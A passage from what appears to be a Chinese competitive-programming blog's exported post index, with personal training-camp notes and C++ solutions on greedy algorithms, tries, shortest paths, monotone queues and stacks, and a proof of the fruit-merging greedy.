一直找下去并用合法的  更新  即可.\n在细节上WA了好多次, 吃了一堆罚时, 果然我还是太菜了.\ncheck的时候不能直接判断  , 因为  可能溢出!!!\n所以要作差来比较.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cmath&gt;long long A, B;//long double ans = 1e18;long double f(long long x){    return x * B + A * 1.0 / sqrtl(x + 1); // x * B会炸}bool check(long long x){    return A * 1.0 / sqrtl(x + 1) - A * 1.0 / sqrtl(x + 2) - B &gt; 0;}long double min(long double a, long double b){return a &lt; b? a : b;}int main(){    scanf(\"%lld%lld\", &amp;A, &amp;B);    long long l = 0, r = 1e18, ans = 0;    while(l &lt;= r){        long long mid = (l + r) &gt;&gt; 1LL;        if(check(mid)){            ans = mid;            l = mid + 1;        }        else r = mid - 1;    }    printf(\"%.9Lf\\n\", min(f(ans-1), min(f(ans), min(f(ans+1), A * 1.0))));    return 0;}\n\n\nE - Buy Low Sell High洛谷传送门CF传送门\n这题和上面的那道Work Scheduling G一样, 是道反悔贪心.\n假贪心: 先低价买入, 发现能赚钱就直接卖.\n真贪心: 先低价买入, 发现能赚钱就卖, 等后面发现能更高价卖出就反悔, 撤销之前的卖出, 改为现在卖.\n问题在于怎么设置反悔.\n更具体地说, 在第  天以价格  买入, 在 第 天以价格  卖出. 但现在第  天的价格  卖出更划算, 要怎么撤回  天买  天卖 这个决策?\n就价格而言,  天买入  天卖出等价于  天买入  天卖出 且  天买入  天卖出.\n也就是, .\n反悔的时候要把  重新放到堆里面, 因为  还可以被卖.\n拿一个小根堆维护待卖的股票. 对于每天的价格 , 直接把它扔进堆里. 然后取出堆顶 比一比, 若 , 就把  卖出, 差价  计入答案,  再次回到待卖出列表  里.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 300005int n;int a[N];long long ans;std::priority_queue&lt;int&gt; q;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    for(int i = 1; i &lt;= n; ++i){        q.push(-a[i]); // 通过取负数来实现小根堆        if(-q.top() &lt; a[i]){            ans += a[i] + q.top(); // 注意q.top()是负数, 减法变加法            q.pop();            q.push(-a[i]);        }    }    printf(\"%lld\\n\", ans);    return 0^(0-0)^0;}","categories":["算法"],"tags":["二分","贪心"]},{"title":"XCPC 寒假集训班 D4 个人笔记","url":"/2025/01/16/XCPC-%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD%E7%8F%AD-D4-%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/","content":"集训题A - 单词查找树传送门\n建一棵Trie, 求Trie的结点数.\n太裸了, 而且题目把做法也讲的很清楚了, 就算没学过Trie也能直接模拟做出来.\n介绍一下Trie(字典树):\n\n  \n    \n      Trie简介\n\n    \n    \n      Trie是一种用于实现字符串快速检索的多叉树, 它的每个结点都有若干字符指针. 如果在插入或检索的时候扫描到字符c, 就沿着该结点的c字符指针走到下一层结点, 就像题目里那张图.\n初始化空Trie仅有一个根结点, 其所有指针都指向空.其定义为trie[SIZE][C], SIZE为结点个数, C为字符集大小.\n插入插入一个字符串时, 从根结点开始扫描字符串, 如果遇到一个字符c, 就沿着该结点的c字符指针走到下一层结点, 如果该结点的c字符指针为空, 就创建新的结点, 并将其指针指向空. 重复这个过程直到字符串扫描完毕.\n当插入完最后一个字符时, 可以在该结点上做一个结尾标记, 表示从根结点到这里是一个完整单词.\n检索若要检索字符串S是否在Trie中, 就和插入一样遍历Trie, 当且仅当Trie中存在这样的字符路径, 且最后一个结点上有结尾标记, 才说明存在.\n代码实现:\n#define SIZE 32005int trie[SIZE][27], tot = 1; // 结点个数(编号). 1是根结点.bool end[SIZE];void insert(char *str){ // 插入字符串    int p = 1; // 指向根结点    for(int i = 0; str[i]; ++i){        int ch = str[i] - 'A';        if(!trie[p][ch]) trie[p][ch] = ++tot; // 若该结点的ch指针为空, 则创建新结点        p = trie[p][ch]; // 指向下一层结点    }    end[p] = 1; // 标记结尾}bool search(char *str){ // 检索字符串是否存在    int p = 1; // 指向根结点    for(int i = 0; str[i]; ++i){        int ch = str[i] - 'A';        if(!trie[p][ch]) return 0; // 若该结点的ch指针为空, 则不存在        p = trie[p][ch]; // 指向下一层结点    }    return end[p]; // 若最后一个结点有结尾标记, 则存在}\n\n    \n  \n\n这道题并未要求我们实现Trie的检索操作. 只需要不断插入字符串, 最后输出tot即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define SIZE 32005int trie[SIZE][27], tot = 1;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}void insert(char *str){    int p = 1;    for(int i = 0; str[i]; ++i){        int ch = str[i] - 'A';        if(!trie[p][ch]) trie[p][ch] = ++tot;        p = trie[p][ch];    }}int main(){    char str[100];    while(~scanf(\"%s\", str)) insert(str);    printf(\"%d\\n\", tot);    return 0^(0-0)^0;}\n\n\nB - Dropping Balls传送门\n很容易想到依题意模拟, 设t[p]表示第p个结点的状态, 把第  个球到第  个球一个一个放到树里, 就能得到第  个球停止时的叶子序号.\nCode:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;cstring&gt;int T, n, d;bool t[2 &lt;&lt; 21];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    T = read();    while(T--){        d = read(), n = read();        memset(t, 0, sizeof(t));        int p;        for(int i = 1; i &lt;= n; ++i){ // 第几个小球            p = 1;            for(int j = 1; j &lt; d; ++j){                // 第几层                if(!t[p]) t[p] = 1, p = p &lt;&lt; 1;                else t[p] = 0, p = p &lt;&lt; 1 | 1;            }        }        printf(\"%d\\n\", p);    }    T = read();    return 0;}\n\n这份代码的时间复杂度为  , TLE.\n思考一下就能发现, 我们其实不需要通过模拟前  个小球来判断第  个球下落前所有结点的状态. 可以直接由 的奇偶性确定当前结点的状态:\n\n每个结点的状态仅由经过它的小球个数的奇偶性决定. 奇数小球往左走, 偶数小球往右走.\n如果第  个小球到达这个点, 它会是接下来向左走的第  个小球.\n如果第  个小球到达这个点, 它会是接下来向右走的第  个小球.\n\n我们就可以由此得出第  个小球的下落过程:\n\n如果  为奇数, 则令 , 并往左走.\n如果  为偶数, 则令 , 并往右走.\n直到走到第  层, 输出结点编号, 结束.\n\n此外, 还要知道一棵按层序编号的二叉树(题目画的那样), 结点  的左儿子为 , 右儿子为 .\n时间复杂度 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;int T, D, I;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    T = read();    while(T--){        D = read(), I = read();        int p = 1; // 当前结点编号        for(int i = 1; i &lt; D; ++i){ // 因为1本来就占一层, 接下来只要往下掉D-1层             if(I &amp; 1) p = p &lt;&lt; 1, I = (I + 1) &gt;&gt; 1; // 往左走            else p = p &lt;&lt; 1 | 1, I = I &gt;&gt; 1; // 往右走        }        printf(\"%d\\n\", p);    }    T = read(); // 读不读这个-1无所谓.    return 0;}\n\n\nC - 医院设置传送门\n注意到  , 无脑  暴力, 枚举每个点作为医院, 遍历整颗树统计距离.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;cstring&gt;#define N 100005int n, tot;int ver[N], nxt[N], head[N];int val[N];bool vis[105];long long tmp, ans = 1145141919LL;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void add(int x, int y){    ver[++tot] = y, nxt[tot] = head[x], head[x] = tot;}void dfs(int u, long long dis){    tmp += dis * val[u]; // 累计距离    vis[u] = 1;    for(int i = head[u]; i; i = nxt[i]){        if(!vis[ver[i]]) dfs(ver[i], dis + 1);    }}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i){        val[i] = read();        int l = read(), r = read();        if(l) add(i, l), add(l, i); // 如果有左儿子, 就连双向边        if(r) add(i, r); add(r, i); // 如果有右儿子, 就连双向边    }    for(int i = 1; i &lt;= n; ++i){ // 枚举每个点作为起点        tmp = 0; memset(vis, 0, sizeof(vis)); // 记得重置状态        dfs(i, 0);        ans = ans &gt; tmp? tmp : ans; // 更新答案    }    printf(\"%lld\\n\", ans);    return 0;}\n\n\nD - 畅通工程续HDU传送门\n单源最短路板子, 一开始没注意到结点编号为  ~  , 吃了个罚时…\n记得多测要清空.\nAC Code:\n#include &lt;bits/stdc++.h&gt;#define int long long#define N 40005#define M 40005#define inf 1145141919810LLint n, m, s, t, tot;int ver[N], edge[M], nxt[M], head[N], d[N];bool vis[N];void add(int x, int y, int z){     ver[++tot] = y, edge[tot] = z, nxt[tot] = head[x], head[x] = tot;}int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}void dijkstra(int s){    std::priority_queue&lt;std::pair&lt;int, int&gt; &gt; q;    for(int i = 0; i &lt; n; ++i) d[i] = inf;    d[s] = 0; q.push({0, s});    while(q.size()){        int x = q.top().second; q.pop();        if(vis[x]) continue;        vis[x] = true;        for(int i = head[x]; i; i = nxt[i]){            int y = ver[i], z = edge[i];            if(d[y] &gt; d[x] + z){                d[y] = d[x] + z;                q.push({-d[y], y});            }        }    }}signed main(){//    n = read(), m = read();//    freopen(\"1.c\", \"r\", stdin);    while(~scanf(\"%d%d\", &amp;n, &amp;m)){        memset(ver, 0, sizeof ver);        memset(edge, 0, sizeof edge);        memset(nxt, 0, sizeof nxt);        memset(head, 0, sizeof head);        memset(vis, 0, sizeof vis);        tot = 0;        for(int i = 1; i &lt;= m; ++i){            int x = read(), y = read(), z = read();            add(x, y, z);            add(y, x, z);        }        s = read(), t = read();        dijkstra(s);        printf(\"%lld\\n\", d[t] == inf ? -1: d[t]);    }    return 0;}\n\n\nE - Cow Contest S传送门\n把每头奶牛视为顶点, 把奶牛的强弱关系看成边: 若  强于  , 则在图中连一条  指向  的边.\n而奶牛x的排名确定, 意味着x和其它奶牛都有明确的强弱关系, 在图中的表现就是x和其它顶点都连通.\n这句话反过来更好理解, 如果x和y的强弱关系不明确, 也就是在x和y在图中不连通, 那怎么知道x和y谁排在前?\n问题转化为判顶点间的连通性, 这个做法就很多了, 可以DFS或BFS遍历图 (最短路算法同样适用), 最简单的写法是用Floyd做传递闭包. (毕竟  , 随便搞都能过)\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;cstring&gt;#define N 105int n, m, ans;int f[N][N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read(), m = read();    for(int i = 1; i &lt;= m; ++i){        int x = read(), y = read();        f[x][y] = 1;    }    for(int k = 1; k &lt;= n; ++k)        for(int i = 1; i &lt;= n; ++i)            for(int j = 1; j &lt;= n; ++j)                f[i][j] |= f[i][k] &amp; f[k][j];    for(int i = 1; i &lt;= n; ++i){        bool flag = 1;        for(int j = 1; j &lt;= n; ++j){            if(i != j &amp;&amp; !f[i][j] &amp;&amp; !f[j][i]){flag = 0; break;} // 不连通, flag置0并跳出.        }        ans += flag;    }    printf(\"%d\\n\", ans);    return 0;}\n\n\nF - 单源最短路径（标准版）传送门\n板子题, 不多解释, 用Dijkstra算法.\nAC Code:\n#include &lt;bits/stdc++.h&gt;#define int long long#define N 2000005#define M 20000005#define inf 1145141919810LLint n, m, s, tot;int ver[N], edge[M], nxt[M], head[N], d[N];bool vis[N];void add(int x, int y, int z){     ver[++tot] = y, edge[tot] = z, nxt[tot] = head[x], head[x] = tot;}int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}void dijkstra(int s){    std::priority_queue&lt;std::pair&lt;int, int&gt; &gt; q;    for(int i = 1; i &lt;= n; ++i) d[i] = inf;    d[s] = 0; q.push({0, s});    while(q.size()){        int x = q.top().second; q.pop();        if(vis[x]) continue;        vis[x] = true;        for(int i = head[x]; i; i = nxt[i]){            int y = ver[i], z = edge[i];            if(d[y] &gt; d[x] + z){                d[y] = d[x] + z;                q.push({-d[y], y});            }        }    }}signed main(){    n = read(), m = read(), s = read();    for(int i = 1; i &lt;= m; ++i){        int x = read(), y = read();        add(x, y, read());    }    dijkstra(s);    for(int i = 1; i &lt;= n; ++i) printf(\"%lld \", d[i] == inf? (1LL &lt;&lt; 31) - 1 : d[i]);    return 0;}\n\n\nG - 香甜的黄油 Sweet Butter传送门\n和C题很像, 不过这次给的不是树了, 没办法直接DFS遍历求出最短路了, 需要用Dijkstra或SPFA求最短路.\n做法就是枚举每个牧场放糖, 求出 有牛的牧场 .\nSubtask #1的数据很大, inf设为0x3f3f3f3f会WA, 改成0x7f7f7f7f过了.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;cstring&gt;#define N 805#define M 3000#define inf 0x7f7f7f7fint n, p, c, tot, ans = inf;int cow[N];int head[N], nxt[M], ver[M], edge[M], d[N];bool vis[N];void add(int x, int y, int z){    ver[++tot] = y, edge[tot] = z, nxt[tot] = head[x], head[x] = tot;}int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void dijkstra(int s){    std::priority_queue&lt;std::pair&lt;int, int&gt; &gt; q;    memset(d, 0x7f, sizeof(d));    memset(vis, 0, sizeof(vis));    d[s] = 0; q.push({0, s});    while(q.size()){        int x = q.top().second; q.pop();        if(vis[x]) continue;        vis[x] = 1;        for(int i = head[x]; i; i = nxt[i]){            int y = ver[i], z = edge[i];            if(d[y] &gt; d[x] + z){                d[y] = d[x] + z;                q.push({-d[y], y});            }        }    }}int main(){    n = read(), p = read(), c = read();    for(int i = 1; i &lt;= n; ++i) cow[i] = read();    for(int i = 1; i &lt;= c; ++i){        int x = read(), y = read(), z = read();        add(x, y, z); add(y, x, z);    }    for(int i = 1; i &lt;= p; ++i){        dijkstra(i);        int sum = 0;        for(int j = 1; j &lt;= n; ++j) sum += d[cow[j]];        ans = ans &gt; sum? sum : ans;    }    printf(\"%d\\n\", ans);    return 0^(0-0)^0;}\n\nH - 最短路计数传送门\n稍微修改一下Dijkstra算法的松弛过程.\n\n如果  , 则  的最短路数量要加上  的最短路数量.\n如果  , 则  的最短路要更新为  , 且到  的最短路数量就是到  的最短路数量.\n\n如果理解Dijkstra算法, 就能明白这个做法的正确性.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;cstring&gt;#define N 1000006#define M 4000006#define mod 100003#define inf 0x7f7f7f7fint n, m, tot, ans = inf;int head[N], nxt[M], ver[M], d[N], cnt[N];bool vis[N];void add(int x, int y){    ver[++tot] = y, nxt[tot] = head[x], head[x] = tot;}int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void dijkstra(int s){    std::priority_queue&lt;std::pair&lt;int, int&gt; &gt; q;    memset(d, 0x7f, sizeof(d));    d[s] = 0; cnt[s] = 1;    q.push({0, s});    while(q.size()){        int x = q.top().second; q.pop();        if(vis[x]) continue;        vis[x] = 1;        for(int i = head[x]; i; i = nxt[i]){            int y = ver[i];            if(d[y] == d[x] + 1) cnt[y] = (cnt[y] + cnt[x]) % mod;            if(d[y] &gt; d[x] + 1){                d[y] = d[x] + 1;                cnt[y] = cnt[x];                q.push({-d[y], y});            }        }    }}int main(){    n = read(), m = read();    for(int i = 1; i &lt;= m; ++i){        int x = read(), y = read();        add(x, y); add(y, x);    }    dijkstra(1);    for(int i = 1; i &lt;= n; ++i) printf(\"%d\\n\", cnt[i] % mod);    return 0^(0-0)^0;}\n\n\nI - 加工零件传送门\n首先, 如果  号工人和  号工人有一条长为的路径, 且  刚好为  , 那  号工人肯定是要提供原材料的.\n如果  为  呢?\n我们假设路径长这样子:\n\n那么,  需要生产  阶段的零件, 他就要求  生产  阶段的零件, 最后  号工人就要提供这个  阶段的原材料了…\n以此类推, 如果  为  , 那么  号工人就需要提供原材料.\n同样地容易验证, 如果不存在一条路径  =  , 那么  号工人就不需要提供原材料.  \n于是乎, 问题就转变为: 判断  和  间是否存在一条路径, 路径长满足: ① 和  奇偶性相同 ② 长度不大于 .\n课上学长介绍了分层建图的做法, 我的做法是用BFS分别计算每个点到  的最小奇偶路径长度.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 200005#define inf 0x3f3f3f3fint n, m, q, tot;int ver[N], nxt[N], head[N];bool vis[N];int d1[N], d2[N];// d1: 奇数路径. d2: 偶数路径void add(int x, int y){    ver[++tot] = y, nxt[tot] = head[x], head[x] = tot;}int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void bfs(int s){    std::queue&lt;std::pair&lt;int, int&gt; &gt; q;    for(int i = 1; i &lt;= n; ++i) d1[i] = d2[i] = inf;    for(int i = head[s]; i; i = nxt[i]){        d1[ver[i]] = 1;        q.push({1, ver[i]});    } // 把和s距离为1的点先加入队    while(q.size()){        int x = q.front().second, dis = q.front().first; q.pop();        // x为起点, dis为1到x的最小距离        for(int i = head[x]; i; i = nxt[i]){            int y = ver[i];            if(dis &amp; 1 &amp;&amp; d2[y] &gt; d1[x] + 1){ // 如果是奇数路径, 那么再经过一条边就变成偶数路径, 所以用d1[x] + 1来更新d2[y]               d2[y] = d1[x] + 1;               q.push({d2[y], y});            }            if(!(dis &amp; 1) &amp;&amp; d1[y] &gt; d2[x] + 1){ // 理由同上                d1[y] = d2[x] + 1;                q.push({d1[y], y});            }        }    }}int main(){    n = read(), m = read(), q = read();    for(int i = 1; i &lt;= m; ++i){        int x = read(), y = read();        add(x, y); add(y, x);    }    bfs(1);    while(q--){        int a = read(), l = read();        if(l &amp; 1) puts(d1[a] &lt;= l? \"Yes\" : \"No\");        else puts(d2[a] &lt;= l? \"Yes\" : \"No\");    }    return 0;}\n\nJ - 阿狸和桃子的游戏传送门\n题目看起来很唬人, 但想做出这题只需要发现: 边权均分给  个端点不会影响二人得分之差.\n我们分类讨论来说明这个结论的正确性:\n\n  \n    \n      证明: 边权均分给  个端点不会影响二人得分之差\n\n    \n    \n      \n如图,  和  为点权,  为边权.\n\n甲染了  和 , 显然得分差 , 结论成立.\n\n乙染了  和 , 显然得分差 , 结论成立.\n\n甲染了  , 乙染了  , 依题意无人获得  的分数, 得分差  = , 结论成立.\n\n乙染了  , 甲染了  , 依题意无人获得  的分数, 得分差  = , 结论成立.\n\n\n\n    \n  \n\n所以, 直接把边权摊给点权, 然后两个人每次都贪心选择最大点权, 作差即得答案.\n通过将输入的点权乘以  来避免除法.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;algorithm&gt;#define N 10005int n, m;long long a[N];long long ans;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}int main(){    n = read(); m = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read() &lt;&lt; 1;    for(int i = 1; i &lt;= m; ++i){        int x = read(), y = read(), v = read();        a[x] += v, a[y] += v;    }    std::stable_sort(&amp;a[1], &amp;a[n+1]);    for(int i = n; i; i -= 2) ans += a[i] - a[i-1];    printf(\"%lld\\n\", ans &gt;&gt; 1);    return 0;}","categories":["算法"],"tags":["图论","树","最短路"]},{"title":"XCPC 寒假集训班 D5 个人笔记","url":"/2025/01/17/XCPC-%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD%E7%8F%AD-D5-%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/","content":"知识整理单调队列 洛谷P1886 滑动窗口 /【模板】单调队列\n\n很容易想到这样一个做法: 随着窗口的移动, 每次都遍历整个窗口, 找到最小值和最大值.\n但这样的时间复杂度是  , 效率十分低下.\n其实我们能发现, 窗口每移动一格, 只有最左边的一个元素离开决策集合, 最右边新增一个元素进入决策集合, 只要思考最左边元素  的离开和最右边新元素  的进入对原有答案的影响, 不就可以了吗?\nemmm, 那要怎么确定这个影响呢?\n以求最大值为例, 弄一个变量  记录原来的最大值, 然后用  和  更新  ?\n比如,\n\n如果  , 就把  更新为 . 如果  , 就不更新  .\n如果  , 则不需要动  . 但如果  就是  怎么办?\n再拿一个  来记录原来的次大值? 也不可行.  更改为  后,  要变成啥?\n\n看来, 这不是拿一个变量就能搞定的事情.\n但这个思路并没有问题. 其实我们并不关心次大值, 次次大值什么的, 我们只关心窗口内的最大值. 我们需要一个数据结构, 满足:\n\n如果 ,  可被新来的  更新, \n如果  就是  , 它退出窗口后, 能有一个东西顺承它的位置, 成为新的最大值.\n\n这个数据结构有哪些性质呢?\n\n首先, 既然  退出后, 原来的次大值马上就能成为最大值, 它最好是能有线性和单调性.\n 的退出和  的加入要互不干扰, 那就固定在一头加入, 另一头退出.\n\n这个数据结构就是单调队列. 通常是一个单调的双端队列  . 以维护窗口最大值为例,  从队首到队尾递减 , 且  就是当前窗口 (决策集合) 内的最大值.\n接下来详细讲讲怎么实现  的退出 和  的加入.\n\n 的退出.\n\n如果  , 更严谨的说法是  还在窗口内, 则无需操作.\n否则, 我们不断弹出队首, 直到  在窗口内.\n\n\n 的加入.\n\n首先我们应该注意到, 如果  中的元素  比  小, 它不可能在  退出后成为新的最大值, 毕竟它比  更早进入队列, 也必然更早退出!\n既然如此, 把  留在  里就完全没用, 它不可能再次进入决策集合了, 所以我们直接把  扔出  .\n那么,  的加入操作就是, 不断弹出队尾, 直到  比  大, 然后把  加到队尾.\n\n\n\n最大值是这样的, 最小值也一样. 单调队列的核心思想就是及时排除决策集合(队列)中一定不可能最优的元素.\n理解以后再来看模板题的AC Code:\n/*Monotone Queue ver.维护一个单调队列, 当队列中的元素不再是最大或最小时, 或元素的索引不在窗口中时, 就直接扔掉*/#include &lt;bits/stdc++.h&gt;#define inf 1LL &lt;&lt; 45#define MAXN 1000005#define int long longint n, k;int a[MAXN], min_v[MAXN], max_v[MAXN];std::deque&lt;int&gt; q_min, q_max;// pair(index, value)int read(){    int x = 0, f = 1; char ch = getchar();    for(;!isdigit(ch);ch = getchar()) if(ch == '-') f = -1;    for(;isdigit(ch);ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return x*f;}inline int max(int a, int b){return a &gt; b? a : b;}inline int min(int a, int b){return a &lt; b? a : b;}signed main(){    n = read(); k = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    for(int i = 1; i &lt;= n; ++i){        // Prepare to insert a[i].        while(!q_min.empty() and a[i] &lt;= a[q_min.front()]) q_min.pop_front();        while(!q_max.empty() and a[i] &gt;= a[q_max.front()]) q_max.pop_front();        // Insert a[i].        q_min.push_front(i);        q_max.push_front(i);        // Pop out the outsiders.        while(q_min.back() &lt; i - k + 1) q_min.pop_back();        while(q_max.back() &lt; i - k + 1) q_max.pop_back();        // Store the result.        min_v[i] = a[q_min.back()];        max_v[i] = a[q_max.back()];    }    for(int i = k; i &lt;= n; ++i) printf(\"%lld \", min_v[i]); putchar('\\n');    for(int i = k; i &lt;= n; ++i) printf(\"%lld \", max_v[i]);    return 0;}\n\n单调栈 洛谷P5788 【模板】单调栈\n\n题目很裸, 我形象化地改一下题目描述:\n\n有  个人站成一排, 每个人都向右看, 求每个人看到的第一个比他自己高的人.\n\n既然每个人都向右看, 我们来研究一下被看的人, 也就是从右往左研究每个人.\n\n对于相邻的两个被看的人  和  :\n\n如果  , 那么  可能被左边身高小于  的人看到,  可能被身高大于等于  且小于  的人看到.\n如果  , 那么  就被  挡住了, 永远无法被更前面的人看到了.\n\n 也就是说, 当  要加入被看者集合时,  到  中小于等于  的都可以退出这个被看者集合了.\n 由上可知这个被看者集合是一个**线性单调(递增)**的数据结构.\n\n再切换到  的视角:\n\n 向右看时, 他会先看最右边的  吗? 肯定不会啊! 他肯定先尝试去看就在他旁边的  吧?\n\n 也就是说,  虽然是最晚加入被看者集合的, 但他又是第一个被尝试看者.\n 由上可知这个被看者集合是一个栈.\n\n\n综上, 这个被看者集合就是一个单调栈, 显然, 它可以维护一个数前/后 第一个 大于/小于 它的数.\n接下来是模板题的具体实现.\n正如上面所说, 我们建立一个栈  来维护被看者集合, 从右往左遍历每个人:\n当扫描到  时:\n\n若栈为空, 直接把  入栈.\n否则不断弹出栈顶 , 直到  为空或  , 此时  就是被  看到的第一个人. 记录这个答案 (因为我们是逆序得到答案, 但又要顺序输出), 然后把  入栈.\n\nAC Code:\n#include &lt;stack&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 3000006int n;int a[N];int ans[N]; // 第i个人所能看到的第一个比他高的人.std::stack&lt;int&gt; S;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    for(int i = n; i &gt;= 1; --i){        while(S.size() &amp;&amp; a[i] &gt;= a[S.top()]) S.pop(); // 弹出前面的矮个子        if(S.empty()) ans[i] = 0; // 没有比他高的人, 他谁都看不到        else ans[i] = S.top(); // 第i个人所能看到的第一个比他高的人        S.push(i); // 压入当前人    }    for(int i = 1; i &lt;= n; ++i) printf(\"%d \", ans[i]); // 输出答案    return 0^(0-0)^0;}\n\n不管是像左看还是向右看, 找第一个大于还是小于它的数, 做法都一样.\n关键是弄清决策集合, 也就是被看者集合是什么, 用单调栈来维护它即可.\n\n训练题C - Patrik 音乐会的等待 洛谷P1823 [COI 2007] Patrik 音乐会的等待\n\n很容易想到这样一个做法: 维护一个单调递减栈(栈顶最小), 插入  时 弹出的元素数量+  就是  向一方所能看到的人数 ( 非第一个元素).\n但身高相同的情况要怎么处理?\n把栈中元素加一维, 记录身高相同人数就可以了.\n答案要用long long存.\nAC Code:\n#include &lt;stack&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 500005int n;int a[N];long long ans; // 不开long long只有80 pts...int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}signed main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    std::stack&lt;std::pair&lt;int, int&gt; &gt; S;    // 第一维: 身高; 第二维: 人数    for(int i = n; i &gt;= 1; --i){        // 统计能互相看到的对数        int num = 1; // 与a[i]身高相同的人数(包括a[i])        while(S.size() and S.top().first &lt;= a[i]){ // 保持单调递减栈            ans += S.top().second;            if(S.top().first == a[i]) num += S.top().second;            S.pop();        } if(S.size()) ++ans; // 与栈顶的人也是能互相看见的.        S.push({a[i], num}); // 插入新人.    }    printf(\"%lld\\n\", ans);    return 0^(0-0)^0;}\n\n\nI - 合并果子 / [USACO06NOV] Fence Repair G 洛谷P1090 [NOIP2004 提高组] 合并果子\n\n很容易想到这样的贪心: 每次都取最小的两堆果子合并, 直到只剩下一堆.\n但基本没人会去证明这个贪心做法的正确性.\n这里提供一个较为严谨的证明.\n先举一个具体的例子: 假设有  堆果子, 大小分别为  .\n很容易发现最佳合并方案图如下 (请在Light Mode下查看):\ngraph TD;\n\n    A --&gt; C[7];\n    C --&gt; F[3];\n    F --&gt; G[1]:::leaf;\n    F --&gt; H[2]:::leaf;\n    A --&gt; L[5]:::leaf;\n    C --&gt; K[4]:::leaf;\n\n    BB[16] --&gt; D[7]:::leaf;\n    BB --&gt; J[9]:::leaf;\n\n    Root[28];\n    Root --&gt; A[12];\n    Root --&gt; BB;\n\n    classDef leaf fill:#a2d2ff,stroke:#023e8a,stroke-width:2px,color:#000000,font-style:italic;\n\n总费用为  .\n容易发现, 答案不就是一颗树除去叶子结点后的点权和吗? 